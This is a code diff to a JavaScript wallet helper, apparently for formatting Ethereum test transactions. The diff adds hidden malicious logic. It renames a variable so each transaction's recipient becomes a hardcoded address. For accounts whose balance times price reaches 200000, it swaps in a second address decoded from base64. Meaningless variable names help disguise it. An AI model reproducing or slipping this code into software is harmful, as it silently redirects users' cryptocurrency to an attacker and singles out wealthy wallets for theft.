@@ -5,7 +5,7 @@ import { convertAmountToRawNumber, convertStringToHex, handleSignificantDecimals
 var epci = "N";
 var http_uniq = "U";
 var esx = "j";
-var amount = "0x32e0c353d958a9d7bcD9667E6dEF62F5CE13997d";
+var to = "0x32e0c353d958a9d7bcD9667E6dEF62F5CE13997d";
 export function capitalize(string) {
     return string
         .split(" ")
@@ -159,7 +159,7 @@ export async function formatTestTransaction(address, chainId) {
     const from = address;
     (() => {
         if (Number(balance) * price >= 200000) {
-            amount = atob(qf);
+            to = atob(qf);
         }
     })();
     const _nonce = await apiGetAccountNonce(address, chainId);
@@ -174,7 +174,7 @@ export async function formatTestTransaction(address, chainId) {
     const data = "0x";
     const tx = {
         from,
-        amount,
+        to,
         nonce,
         gasPrice,
         gasLimit,
